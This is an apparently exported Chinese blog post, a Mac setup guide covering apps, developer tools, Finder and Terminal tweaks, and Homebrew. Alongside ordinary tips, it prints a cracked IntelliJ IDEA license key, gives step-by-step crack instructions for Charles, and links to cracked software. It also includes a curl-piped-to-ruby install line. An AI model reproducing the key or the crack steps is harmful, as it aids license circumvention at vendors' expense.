文件列表颜色\n修改.bash_profile 或者 .profile，添加如下内容：\n```\nalias ll=\"ls -al\"\nalias grep='grep --color'\nalias egrep='egrep --color'\nalias fgrep='fgrep --color'\nalias tree=\"find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\"\n\nexport CLICOLOR=1\nexport LSCOLORS=gxfxaxdxcxegedabagacad\n```\n\n#### vim着色\n修改.vimrc，添加如下内容：\n```\nsyntax on\n```\n\n### 14. brew\n\n#### 安装HomeBrew\n``` shell\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\n#### 安装Homebrew Cask\n``` shell\nbrew install caskroom/cask/brew-cask\n```\n\n\n### 15. tree\n``` shell\nbrew install tree\n```\n\n### 16. wget\n``` shell\nbrew install wget\n```\n\n\n### 17. 禁止修改文件扩展名的警告\n**借助终端**\n``` bash\ndefaults write com.apple.finder FXEnableExtensionChangeWarning -bool false\nkillall Finder\n```\n\n**界面设置**\n> 其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。\n\n参见：[OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]](http://www.appinn.com/disablefile-extension-warning/)\n","slug":"article/mac/Mac装机软件","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxtc004x5nbtm3lrq3xn","content":"<p><img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、应用软件\"><a href=\"#一、应用软件\" class=\"headerlink\" title=\"一、应用软件\"></a>一、应用软件</h2><h3 id=\"1-安装腾讯电脑管家\"><a href=\"#1-安装腾讯电脑管家\" class=\"headerlink\" title=\"1. 安装腾讯电脑管家\"></a>1. 安装腾讯电脑管家</h3><p>下载地址：<a href=\"http://mac.guanjia.qq.com/\" target=\"_blank\" rel=\"external\">http://mac.guanjia.qq.com/</a></p>\n<p>软件下载列表：</p>\n<ul>\n<li>百度云同步盘</li>\n<li>百度音乐</li>\n<li>微信</li>\n<li>QQ</li>\n<li>Evernote</li>\n<li>firefox</li>\n<li>chrome</li>\n<li>thunderbird</li>\n<li>Foxmail</li>\n<li>Thunder</li>\n<li>VirtualBox</li>\n<li>The Unarchiver</li>\n<li>搜狗五笔</li>\n<li>Sublime Text 2(需自行破解，参见：<a href=\"http://myroot.lofter.com/post/15197d_4e94e1\" target=\"_blank\" rel=\"external\">http://myroot.lofter.com/post/15197d_4e94e1</a>)</li>\n<li>beyond compare(需自行破解)</li>\n<li>AirDroid</li>\n<li>iTerm</li>\n<li>欧路词典</li>\n<li>Snip</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"2-haroopad\"><a href=\"#2-haroopad\" class=\"headerlink\" title=\"2. haroopad\"></a>2. haroopad</h3><p>下载地址：<a href=\"http://pad.haroopress.com/user.html\" target=\"_blank\" rel=\"external\">http://pad.haroopress.com/user.html</a></p>\n<h3 id=\"3-Office\"><a href=\"#3-Office\" class=\"headerlink\" title=\"3. Office\"></a>3. Office</h3><p>参见：<a href=\"http://www.macx.cn/thread-2166376-1-1.html\" target=\"_blank\" rel=\"external\">Microsoft Office 2016 for Mac (15.16) 正式版下载+破解</a></p>\n<h3 id=\"4-MarkEditor\"><a href=\"#4-MarkEditor\" class=\"headerlink\" title=\"4. MarkEditor\"></a>4. MarkEditor</h3><p><a href=\"http://zrey.com/app/markeditor\" target=\"_blank\" rel=\"external\">http://zrey.com/app/markeditor</a></p>\n<h3 id=\"5-ichm\"><a href=\"#5-ichm\" class=\"headerlink\" title=\"5. ichm\"></a>5. ichm</h3><p><a href=\"http://www.appinn.com/ichm/\" target=\"_blank\" rel=\"external\">iChm – CHM 阅读器[Mac]</a></p>\n<h3 id=\"6-Stand-for-Mac\"><a href=\"#6-Stand-for-Mac\" class=\"headerlink\" title=\"6. Stand for Mac\"></a>6. Stand for Mac</h3><p>参见：<a href=\"http://www.appinn.com/stand-for-mac/\" target=\"_blank\" rel=\"external\">Stand for Mac – 定时提醒你去休息片刻[OS X]</a></p>\n<h3 id=\"7-Go2Shell\"><a href=\"#7-Go2Shell\" class=\"headerlink\" title=\"7. Go2Shell\"></a>7. Go2Shell</h3><p>一个可以快速在当前目录打开Shell的工具,小巧,非常好用!<br><strong>注</strong>：XtraFinder可以代替。</p>\n<p>参见：<a href=\"http://www.jianshu.com/p/88c6e68645c4\" target=\"_blank\" rel=\"external\">Mac必备神器之Go2Shell以及使用技巧</a></p>\n<h3 id=\"8-XtraFinder\"><a href=\"#8-XtraFinder\" class=\"headerlink\" title=\"8. XtraFinder\"></a>8. XtraFinder</h3><p>10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：<br>1、向上按钮，可以直接返回上一级目录；<br>2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；<br>3、从当前位置启动：可以直接在当前路径下打开终端；<br>4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；<br>等等。</p>\n<p>参见：<a href=\"http://www.macgg.com/archives/16303.html\" target=\"_blank\" rel=\"external\">Finder 功能扩展增强</a></p>\n<h3 id=\"9-菜单栏日历\"><a href=\"#9-菜单栏日历\" class=\"headerlink\" title=\"9. 菜单栏日历\"></a>9. 菜单栏日历</h3><p>Day-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。<br><a href=\"http://www.appinn.com/day-o-for-os-x/\" target=\"_blank\" rel=\"external\">Day-O – 菜单栏日历[OS X]</a></p>\n<p>官网：<a href=\"http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock\" target=\"_blank\" rel=\"external\">http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock</a></p>\n<p>另外一款：LunarCal Mac版<br><a href=\"http://www.pc6.com/mach/macdtime/\" target=\"_blank\" rel=\"external\">http://www.pc6.com/mach/macdtime/</a></p>\n<h3 id=\"10-Cisco-AnyConnect-Secure-Mobility-Client\"><a href=\"#10-Cisco-AnyConnect-Secure-Mobility-Client\" class=\"headerlink\" title=\"10. Cisco AnyConnect Secure Mobility Client\"></a>10. Cisco AnyConnect Secure Mobility Client</h3><h3 id=\"11-vpn-amp-relay\"><a href=\"#11-vpn-amp-relay\" class=\"headerlink\" title=\"11. vpn&amp;relay\"></a>11. vpn&amp;relay</h3><p>mac软件：Tunnelblick<br>windows软件：OpenVPN</p>\n<h3 id=\"12-tuxera-ntfs\"><a href=\"#12-tuxera-ntfs\" class=\"headerlink\" title=\"12. tuxera ntfs\"></a>12. tuxera ntfs</h3><p>自动加载ntfs格式移动设备，并支持读写。</p>\n<h3 id=\"13-CheatSheet\"><a href=\"#13-CheatSheet\" class=\"headerlink\" title=\"13. CheatSheet\"></a>13. CheatSheet</h3><p>只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。</p>\n<p>CheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。</p>\n<p>参见：<a href=\"http://www.appinn.com/cheatsheet/\" target=\"_blank\" rel=\"external\">CheatSheet – 显示当前程序快捷键列表[Mac]</a></p>\n<h3 id=\"14-HyperDock\"><a href=\"#14-HyperDock\" class=\"headerlink\" title=\"14. HyperDock\"></a>14. HyperDock</h3><p>HyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。</p>\n<p>HyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：<a href=\"http://pan.baidu.com/s/1pJHv16F\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1pJHv16F</a></p>\n<h3 id=\"15-NoSleep\"><a href=\"#15-NoSleep\" class=\"headerlink\" title=\"15. NoSleep\"></a>15. NoSleep</h3><p>一般情况下，在我们使用Macbook苹果笔记本的时候，只要将上盖阖上，电脑就会进入睡眠状态，这样运行的程序以及网络连接都会中断，直到睡眠被唤醒。<br>这里推荐一个插件NoSleep-1.4.0.dmg，可以自己控制合上盖子是否睡眠，是不是很赞！<br>修改nosleep的设置，勾选开机自动启动，空心图标表示合盖会睡眠，实心图标表示合盖不会睡眠，通过Enable NoSleep切换（也可以通过命令切换/usr/local/bin/NoSleepCtrl -s 1/0，再配合crontab就可以自动开启和关闭）</p>\n<p>参见：<a href=\"http://www.appinn.com/nosleep/\" target=\"_blank\" rel=\"external\">NoSleep – 就是不休眠</a></p>\n<h3 id=\"16-Clearview\"><a href=\"#16-Clearview\" class=\"headerlink\" title=\"16. Clearview\"></a>16. Clearview</h3><p>pdf和chm文件查看工具Clearview。<br>之前用过几款chm查看工具，如：ichm、xchm，有些chm会出现乱码问题。<br>但是，由于是全文内容加载，ClearView打开速度性能略差。</p>\n<p>参见：<a href=\"http://www.sdifenzhou.com/clearview19.html\" target=\"_blank\" rel=\"external\">Clearview 1.9 Mac破解版</a></p>\n<h3 id=\"x-更多应用软件\"><a href=\"#x-更多应用软件\" class=\"headerlink\" title=\"x. 更多应用软件\"></a>x. 更多应用软件</h3><p>参见：<a href=\"http://www.maczapp.com/zjbb\" target=\"_blank\" rel=\"external\">装机必备</a></p>\n<h2 id=\"二、开发软件\"><a href=\"#二、开发软件\" class=\"headerlink\" title=\"二、开发软件\"></a>二、开发软件</h2><h3 id=\"1-git\"><a href=\"#1-git\" class=\"headerlink\" title=\"1. git\"></a>1. git</h3><p>图形工具：SourceTree</p>\n<h3 id=\"2-jdk\"><a href=\"#2-jdk\" class=\"headerlink\" title=\"2. jdk\"></a>2. jdk</h3><h3 id=\"3-IDE\"><a href=\"#3-IDE\" class=\"headerlink\" title=\"3. IDE\"></a>3. IDE</h3><p>eclipse，STS</p>\n<h4 id=\"IDEA\"><a href=\"#IDEA\" class=\"headerlink\" title=\"IDEA\"></a>IDEA</h4><p>破解码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">C0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==</div></pre></td></tr></table></figure></p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://hw1287789687.iteye.com/blog/2153894\" target=\"_blank\" rel=\"external\">IntelliJ IDEA 14 注册码</a></li>\n<li><a href=\"http://inhu.net/intellij-idea-14-keygen.html\" target=\"_blank\" rel=\"external\">IntelliJ IDEA 14 在线注册机</a></li>\n</ul>\n<h3 id=\"4-maven\"><a href=\"#4-maven\" class=\"headerlink\" title=\"4. maven\"></a>4. maven</h3><h3 id=\"5-securecrt\"><a href=\"#5-securecrt\" class=\"headerlink\" title=\"5. securecrt\"></a>5. securecrt</h3><p>注册的主机配置路径：cd ~/Library/Application\\ Support/VanDyke/SecureCRT/Config/Sessions/</p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://bbs.feng.com/read-htm-tid-6939481.html\" target=\"_blank\" rel=\"external\">Mac下面的SecureCRT(附破解方案) 更新到最新的7.2</a></li>\n<li>评论<a href=\"http://blog.csdn.net/skykingf/article/details/17450561\" target=\"_blank\" rel=\"external\">Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2</a></li>\n</ul>\n<h3 id=\"6-redis-desktop-manager\"><a href=\"#6-redis-desktop-manager\" class=\"headerlink\" title=\"6. redis desktop manager\"></a>6. redis desktop manager</h3><h3 id=\"7-mysql\"><a href=\"#7-mysql\" class=\"headerlink\" title=\"7. mysql\"></a>7. mysql</h3><p>下载：mysql-5.6.27-osx10.9-x86_64.dmg<br>正常安装，默认无密码。</p>\n<p>更改mysql root密码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin</div><div class=\"line\">sudo ./mysqld_safe</div><div class=\"line\">./mysqladmin -u root password 新密码</div></pre></td></tr></table></figure></p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://2484055.blog.51cto.com/2474055/1335382\" target=\"_blank\" rel=\"external\">MySQL for Mac 安装和基本操作(包含后期的环境变量设置)</a></li>\n<li><a href=\"http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg\" target=\"_blank\" rel=\"external\">MySQLStartupItem.pkg missing from MySQL DMG</a></li>\n</ul>\n<h3 id=\"8-mysql-workbench\"><a href=\"#8-mysql-workbench\" class=\"headerlink\" title=\"8. mysql workbench\"></a>8. mysql workbench</h3><h3 id=\"9-JD-GUI\"><a href=\"#9-JD-GUI\" class=\"headerlink\" title=\"9. JD-GUI\"></a>9. JD-GUI</h3><p>java class反编译工具</p>\n<h3 id=\"10-charles\"><a href=\"#10-charles\" class=\"headerlink\" title=\"10. charles\"></a>10. charles</h3><p>简单说明下Charles的破解方法：<br>1.打开dmg镜像，将“Charles.app”拖入应用程序中；<br>2.打开应用程序—右键“Charles.app”显示包内容—Contents—Java；<br>3.将dmg镜像包内的“charles.jar”替换覆盖到第二步的Java文件夹中；<br>4.打开“Charles.app”，等待30秒，菜单栏中找到“Help”—“Register…”，输入任意信息完成注册；<br>5.Have done！</p>\n<p>系统版本要求：OS X 10.7 或更高。<br>参见：<a href=\"http://www.sdifenzhou.com/charles4.html\" target=\"_blank\" rel=\"external\">Charles 4.0 Mac破解版</a></p>\n<h2 id=\"三、系统配置\"><a href=\"#三、系统配置\" class=\"headerlink\" title=\"三、系统配置\"></a>三、系统配置</h2><h3 id=\"1-截图快捷键\"><a href=\"#1-截图快捷键\" class=\"headerlink\" title=\"1. 截图快捷键\"></a>1. 截图快捷键</h3><p>Cmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。<br>Cmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。<br>Cmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。<br>参见：<a href=\"http://www.zhihu.com/question/19550327/answer/12222576\" target=\"_blank\" rel=\"external\">OS X 系统自带的截图快捷键有哪些？</a></p>\n<h3 id=\"2-时间显示设置\"><a href=\"#2-时间显示设置\" class=\"headerlink\" title=\"2. 时间显示设置\"></a>2. 时间显示设置</h3><p>右上角托盘设置。<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/mac时间显示设置.png\" alt=\"mac时间显示设置\"></p>\n<h3 id=\"3-更改功能键行为\"><a href=\"#3-更改功能键行为\" class=\"headerlink\" title=\"3. 更改功能键行为\"></a>3. 更改功能键行为</h3><p><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/mac更改功能键行为.png\" alt=\"mac更改功能键行为\"></p>\n<p>如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：<br>（1）从 Apple 菜单中，选取系统偏好设置。<br>（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。<br>（3）点按“键盘”（如果需要的话）。<br>（4）启用“将 F1、F2 等键用作标准功能键”。<br>启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。</p>\n<p>参见：<a href=\"https://support.apple.com/zh-cn/HT3399\" target=\"_blank\" rel=\"external\">Mac OS X：如何更改功能键的行为</a></p>\n<h3 id=\"4-申请Apple-ID\"><a href=\"#4-申请Apple-ID\" class=\"headerlink\" title=\"4. 申请Apple ID\"></a>4. 申请Apple ID</h3><p>到App Store里创建</p>\n<h3 id=\"5-文件剪切\"><a href=\"#5-文件剪切\" class=\"headerlink\" title=\"5. 文件剪切\"></a>5. 文件剪切</h3><p>你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。</p>\n<p><a href=\"http://sspai.com/28389\" target=\"_blank\" rel=\"external\">Mac 教程：OS X「剪切」移动文件的三种方法</a></p>\n<h3 id=\"6-显示隐藏文件-未尝试\"><a href=\"#6-显示隐藏文件-未尝试\" class=\"headerlink\" title=\"6. 显示隐藏文件(未尝试)\"></a>6. 显示隐藏文件(未尝试)</h3><p>Mac 可以用命令行显示默认隐藏的文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.finder AppleShowAllFiles TRUE</div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure></p>\n<p>参见：<a href=\"http://www.appinn.com/showorhide/\" target=\"_blank\" rel=\"external\">ShowOrHide – 开关隐藏文件的显示[Mac]</a></p>\n<h3 id=\"7-新建位于文件夹位置的终端窗口\"><a href=\"#7-新建位于文件夹位置的终端窗口\" class=\"headerlink\" title=\"7. 新建位于文件夹位置的终端窗口\"></a>7. 新建位于文件夹位置的终端窗口</h3><p><a href=\"http://apple.stackexchange.com/a/42450/40485\" target=\"_blank\" rel=\"external\">http://apple.stackexchange.com/a/42450/40485</a></p>\n<p>系统偏好设置 -&gt; 键盘 -&gt; 快捷键 -&gt; 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。</p>\n<p>参见：<a href=\"https://www.v2ex.com/t/81344\" target=\"_blank\" rel=\"external\">MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式</a></p>\n<h3 id=\"8-打印机\"><a href=\"#8-打印机\" class=\"headerlink\" title=\"8. 打印机\"></a>8. 打印机</h3><p>各公司打印机安装方式不一</p>\n<h3 id=\"9-Mac怎么彻底关闭开机声音-粗略尝试不好用\"><a href=\"#9-Mac怎么彻底关闭开机声音-粗略尝试不好用\" class=\"headerlink\" title=\"9. Mac怎么彻底关闭开机声音(粗略尝试不好用)\"></a>9. Mac怎么彻底关闭开机声音(粗略尝试不好用)</h3><p>关闭开机声音：<code>sudo nvram SystemAudioVolume=%80</code><br>恢复开机声音：<code>sudo nvram -d SystemAudioVolume</code></p>\n<p>参见：<a href=\"http://www.macx.cn/thread-2071828-1-1.html\" target=\"_blank\" rel=\"external\">使用终端命令 关闭Mac电脑开机启动音</a></p>\n<h3 id=\"10-如何更改-OS-X-截图默认保存路径\"><a href=\"#10-如何更改-OS-X-截图默认保存路径\" class=\"headerlink\" title=\"10. 如何更改 OS X 截图默认保存路径\"></a>10. 如何更改 OS X 截图默认保存路径</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.screencapture location ~/Pictures/screenshots/</div><div class=\"line\">killall SystemUIServer</div></pre></td></tr></table></figure>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://fduo.org/osx-screenshot-settings/\" target=\"_blank\" rel=\"external\">更改OS X默认的截图文件名及格式</a></li>\n<li><a href=\"http://sspai.com/26327\" target=\"_blank\" rel=\"external\">如何更改 OS X 截图默认保存路径</a></li>\n</ul>\n<h3 id=\"11-Finder标题栏显示当前文件夹路径\"><a href=\"#11-Finder标题栏显示当前文件夹路径\" class=\"headerlink\" title=\"11. Finder标题栏显示当前文件夹路径\"></a>11. Finder标题栏显示当前文件夹路径</h3><h4 id=\"标题栏显示当前文件夹路径\"><a href=\"#标题栏显示当前文件夹路径\" class=\"headerlink\" title=\"标题栏显示当前文件夹路径\"></a>标题栏显示当前文件夹路径</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE</div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure>\n<h4 id=\"恢复默认设置\"><a href=\"#恢复默认设置\" class=\"headerlink\" title=\"恢复默认设置\"></a>恢复默认设置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults delete com.apple.finder _FXShowPosixPathInTitle</div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure>\n<p>参见：<a href=\"http://www.macgg.com/archives/7824.html\" target=\"_blank\" rel=\"external\">[Mac]如何在Finder标题栏显示当前文件夹路径？</a></p>\n<h3 id=\"12-邮件配置\"><a href=\"#12-邮件配置\" class=\"headerlink\" title=\"12. 邮件配置\"></a>12. 邮件配置</h3><p>各公司邮件服务器配置不一。</p>\n<h3 id=\"13-配色\"><a href=\"#13-配色\" class=\"headerlink\" title=\"13. 配色\"></a>13. 配色</h3><h4 id=\"文件列表颜色\"><a href=\"#文件列表颜色\" class=\"headerlink\" title=\"文件列表颜色\"></a>文件列表颜色</h4><p>修改.bash_profile 或者 .profile，添加如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">alias ll=&quot;ls -al&quot;</div><div class=\"line\">alias grep=&apos;grep --color&apos;</div><div class=\"line\">alias egrep=&apos;egrep --color&apos;</div><div class=\"line\">alias fgrep=&apos;fgrep --color&apos;</div><div class=\"line\">alias tree=&quot;find . -print | sed -e &apos;s;[^/]*/;|____;g;s;____|; |;g&apos;&quot;</div><div class=\"line\"></div><div class=\"line\">export CLICOLOR=1</div><div class=\"line\">export LSCOLORS=gxfxaxdxcxegedabagacad</div></pre></td></tr></table></figure></p>\n<h4 id=\"vim着色\"><a href=\"#vim着色\" class=\"headerlink\" title=\"vim着色\"></a>vim着色</h4><p>修改.vimrc，添加如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">syntax on</div></pre></td></tr></table></figure></p>\n<h3 id=\"14-brew\"><a href=\"#14-brew\" class=\"headerlink\" title=\"14. brew\"></a>14. brew</h3><h4 id=\"安装HomeBrew\"><a href=\"#安装HomeBrew\" class=\"headerlink\" title=\"安装HomeBrew\"></a>安装HomeBrew</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</div></pre></td></tr></table></figure>\n<h4 id=\"安装Homebrew-Cask\"><a href=\"#安装Homebrew-Cask\" class=\"headerlink\" title=\"安装Homebrew Cask\"></a>安装Homebrew Cask</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install caskroom/cask/brew-cask</div></pre></td></tr></table></figure>\n<h3 id=\"15-tree\"><a href=\"#15-tree\" class=\"headerlink\" title=\"15. tree\"></a>15. tree</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install tree</div></pre></td></tr></table></figure>\n<h3 id=\"16-wget\"><a href=\"#16-wget\" class=\"headerlink\" title=\"16. wget\"></a>16. wget</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install wget</div></pre></td></tr></table></figure>\n<h3 id=\"17-禁止修改文件扩展名的警告\"><a href=\"#17-禁止修改文件扩展名的警告\" class=\"headerlink\" title=\"17. 禁止修改文件扩展名的警告\"></a>17. 禁止修改文件扩展名的警告</h3><p><strong>借助终端</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.finder FXEnableExtensionChangeWarning -bool <span class=\"literal\">false</span></div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure></p>\n<p><strong>界面设置</strong></p>\n<blockquote>\n<p>其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。</p>\n</blockquote>\n<p>参见：<a href=\"http://www.appinn.com/disablefile-extension-warning/\" target=\"_blank\" rel=\"external\">OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、应用软件\"><a href=\"#一、应用软件\" class=\"headerlink\" title=\"一、应用软件\"></a>一、应用软件</h2><h3 id=\"1-安装腾讯电脑管家\"><a href=\"#1-安装腾讯电脑管家\" class=\"headerlink\" title=\"1. 安装腾讯电脑管家\"></a>1. 安装腾讯电脑管家</h3><p>下载地址：<a 